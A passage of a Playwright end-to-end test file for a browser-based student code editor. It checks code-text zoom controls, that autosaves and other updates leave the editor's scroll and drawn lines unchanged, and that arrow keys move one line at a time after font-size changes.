  await page.keyboard.press('Control+0');
  await expect.poll(async () => (await sizes()).code).toBe(before.code);
  await page.keyboard.press('Control+=');
  await expect.poll(async () => (await sizes()).code).toBeGreaterThan(before.code);
  await page.keyboard.press('Control+-');
  await page.keyboard.press('Control+-');
  await expect.poll(async () => (await sizes()).code).toBeLessThan(before.code);
  expect(await editor.innerText()).not.toMatch(/[=+0-]/);
  await expect(page.getByRole('button', { name: 'Smaller code text' })).toBeDisabled();
  await page.keyboard.press('Control+0');
  for (let i = 0; i < 6; i += 1) await page.keyboard.press('Control+=');
  await expect(larger).toBeDisabled();
  await expect(smaller).toBeEnabled();

  // The size is the editor's, not the file's: another file shows at the same size, and the line numbers go with it.
  const big = (await sizes()).code;
  await page.getByRole('treeitem', { name: 'main.cpp', exact: true }).click();
  await expect(page.getByRole('textbox', { name: /Editor for .*main\.cpp$/ })).toBeVisible();
  expect((await sizes()).code).toBe(big);
  expect(await page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-lineNumbers')).fontSize))).toBe(big);

  // Nothing is written to the student's disk for it.
  expect(await page.evaluate(() => window.__storage)).toEqual([]);
});

test('the toolbar\'s A+ and the editor\'s A+ add up: the editor is the larger of the two', async ({ page }) => {
  await start(page);
  await openSrc(page);
  const code = () => page.evaluate(() => parseFloat(getComputedStyle(document.querySelector('.cm-content')).fontSize));
  const base = await code();
  await page.getByRole('button', { name: 'Larger text' }).click();
  const withToolbar = await code();
  expect(withToolbar).toBeGreaterThan(base);
  await page.getByRole('button', { name: 'Larger code text' }).click();
  expect(await code()).toBeGreaterThan(withToolbar);
});

// ---- the editor holds still ----
// The editor was drawn again from the start (and its scroll lost) at every snapshot of the model: the first keystroke of a file, every
// autosave, a tick, a terminal opening. These tests mark the lines the editor has drawn and see that they are the same ones afterwards.
const bigFile = Array.from({ length: 300 }, (_, i) => `line ${i} of the big file`).join('\n') + '\n';
async function inTheMiddleOfABigFile(page) {
  await start(page, { files: { ...project, 'big.txt': bigFile } }, { width: 1366, height: 768 });
  const editor = await openFile(page, 'big.txt');
  await editor.click();
  await page.keyboard.press('Control+Home');
  for (let i = 0; i < 120; i += 1) await page.keyboard.press('ArrowDown');
  await expect(page.getByRole('group', { name: 'Workspace status' })).toContainText('Nothing to save');
  await page.evaluate(() => document.querySelectorAll('.cm-line').forEach(line => { line.__drawn = true; }));
  return editor;
}
const held = page => page.evaluate(() => {
  const lines = [...document.querySelectorAll('.cm-line')];
  return { scroll: Math.round(document.querySelector('.cm-scroller').scrollTop), lines: lines.length, same: lines.filter(line => line.__drawn).length,
    focused: document.activeElement?.classList.contains('cm-content') ?? false };
});

test('an autosave does not draw the editor again, move its scroll, or move what is around it', async ({ page }) => {
  const editor = await inTheMiddleOfABigFile(page);
  const status = page.getByRole('group', { name: 'Workspace status' });
  const place = () => page.evaluate(() => ({ time: Math.round(document.querySelector('header.toolbar [aria-label="Remaining time"]').getBoundingClientRect().left), tab: Math.round(document.querySelector('.tab.front').getBoundingClientRect().width), save: Math.round(document.querySelector('header.toolbar .save').getBoundingClientRect().width) }));
  const before = { ...(await held(page)), ...(await place()) };
  expect(before.scroll).toBeGreaterThan(1000);

  await page.keyboard.type('x');
  await expect(status).toContainText('Unsaved changes');
  const typing = { ...(await held(page)), ...(await place()) };
  await expect(status).toContainText(/Saved \d/);
  const saved = { ...(await held(page)), ...(await place()) };

  // Only the line that was typed in may be a new element; the scroll and the focus are where they were.
  for (const now of [typing, saved]) {
    expect(now.scroll).toBe(before.scroll);
    expect(now.lines).toBe(before.lines);
    expect(now.same).toBeGreaterThanOrEqual(before.lines - 1);
    expect(now.focused).toBe(true);
    // The time, the tab and the save text keep their size and place from a clean file to an unsaved one to a saved one.
    expect(now.time).toBe(before.time);
    expect(now.tab).toBe(before.tab);
    expect(now.save).toBe(before.save);
  }
  expect(await editor.innerText()).toContain('x');
  expect(await server(page, 'server.requests.filter(r => r.type === "fs.write").length')).toBe(1);
});

test('nor do the other changes the page shows: a TODO tick, a terminal opening, a file made elsewhere', async ({ page }) => {
  await inTheMiddleOfABigFile(page);
  const before = await held(page);
  await page.getByRole('checkbox', { name: /Implement push_front/ }).check();
  await page.getByRole('button', { name: 'Run', exact: true }).click();
  await expect(page.getByRole('region', { name: 'Run output' })).toContainText('list: 3 2 1');
  await page.evaluate(() => window.__studentHarness.workspaceServer.externalWrite('made_elsewhere.txt', 'hello\n'));
  await expect(page.getByRole('treeitem', { name: 'made_elsewhere.txt' })).toBeVisible();
  const after = await held(page);
  // The panel took part of the editor's height, so lines at its foot may have gone; the lines still there are the ones that were.
  expect(after.scroll).toBe(before.scroll);
  expect(after.same).toBeGreaterThan(before.lines / 2);
  expect(after.same).toBe(after.lines);
});

// ---- the cursor after a change of the text size ----
// CodeMirror keeps the height it believes each line has, and moves the cursor up and down by it. It measures the lines again only when
// its content changes height or its theme changes: with the code shorter than the editor (a tall window), a size that came from the
// page's CSS alone left the old heights, and Down went from line 4 to 5, 7, 10, 14. The size is part of its theme now.
const listing = Array.from({ length: 27 }, (_, i) => `    int line_${i + 1} = ${i + 1}; // a line of code`).join('\n') + '\n';
const sizeChanges = {
  'the editor\'s A+ twice': async page => { for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name: /Larger code text/ }).click(); },
  'the editor\'s A− once': page => page.getByRole('button', { name: /Smaller code text/ }).click(),
  'the toolbar\'s A+ twice': async page => { for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name: 'Larger text' }).click(); },
  'the toolbar\'s A− once': page => page.getByRole('button', { name: 'Smaller text' }).click(),
  'both A+ twice': async page => { for (const name of ['Larger text', /Larger code text/]) for (let i = 0; i < 2; i += 1) await page.getByRole('button', { name }).click(); },
};
for (const [name, change] of Object.entries(sizeChanges)) {
  test(`the arrow keys move one line at a time after ${name}, in a window the code does not fill`, async ({ page }) => {
    await start(page, { files: { ...project, 'src/list.cpp': listing } }, { width: 1920, height: 1080 });
    const editor = await openSrc(page);
    await expect(editor).toContainText('line_27');
    await change(page);
    // Click in the text of line 4, as a person does, and walk down and back up.
    await page.locator('.cm-line').nth(3).click({ position: { x: 40, y: 4 } });
    const line = () => page.evaluate(() => Number(document.querySelector('.cm-activeLineGutter')?.textContent));
    expect(await line()).toBe(4);
    for (let expected = 5; expected <= 18; expected += 1) { await page.keyboard.press('ArrowDown'); expect(await line()).toBe(expected); }
    for (let expected = 17; expected >= 4; expected -= 1) { await page.keyboard.press('ArrowUp'); expect(await line()).toBe(expected); }
  });
}
